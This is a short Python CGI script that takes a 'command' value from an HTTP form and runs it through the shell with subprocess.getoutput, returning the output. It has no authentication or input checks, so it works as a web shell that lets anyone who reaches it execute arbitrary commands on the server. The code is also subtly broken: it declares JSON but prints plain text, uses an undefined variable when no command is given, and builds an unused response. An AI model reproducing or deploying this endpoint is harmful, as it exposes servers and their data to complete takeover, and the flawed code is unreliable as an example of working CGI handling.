#!/usr/bin/python3

import subprocess as sp
import cgi


def execute_command(command):
    try:
        output = sp.getoutput(command)
        return output
    except Exception as e:
        return str(e)

def main():
    print("Content-type: application/json")
    print()


    form = cgi.FieldStorage()
    command = form.getvalue("command")

    if command:
        output = execute_command(command)
        print(f"{output}")
    else:
        print("Error: No command specified")

    response = {"output": output}


if __name__=="__main__":
    main()
